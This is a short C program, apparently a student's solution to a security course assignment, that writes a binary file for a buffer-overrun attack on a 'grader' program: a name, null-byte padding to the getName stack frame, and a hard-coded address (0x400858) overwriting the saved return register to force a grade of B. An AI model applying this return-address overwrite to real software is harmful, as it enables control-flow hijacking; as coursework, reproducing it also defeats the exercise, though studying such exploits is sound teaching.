/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Kenar Vyas                                                 */
/*--------------------------------------------------------------------*/
#include <stdio.h>
/* Writes binary data to dataB file. Binary data is data for running
   buffer overrun attack on grader. Returns 0 upon completion. */
int main(void) {
   char* name = "Kenar";
   size_t lenName = 5;
   size_t lenBuf = 48;
   size_t lenNull;
   size_t i;
   unsigned long ulData;
   FILE *psFile;
   
   /* Opens file and enables write access */
   psFile = fopen("datab", "w");
   /* Prints name to file */
   fprintf(psFile, name);

   /* Adds appropriate number of null bytes to reach getName 
      stackframe */
   lenNull = lenBuf - lenName;
   for(i = 0; i < lenNull; i++)
   {
      putc('\0', psFile);
   }

   /* Writes address of print(B) line in main
      to x30 in getName's stackframe */
   ulData = 0x400858;
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);

   /* Closes file */
   fclose(psFile);
   return 0;
}
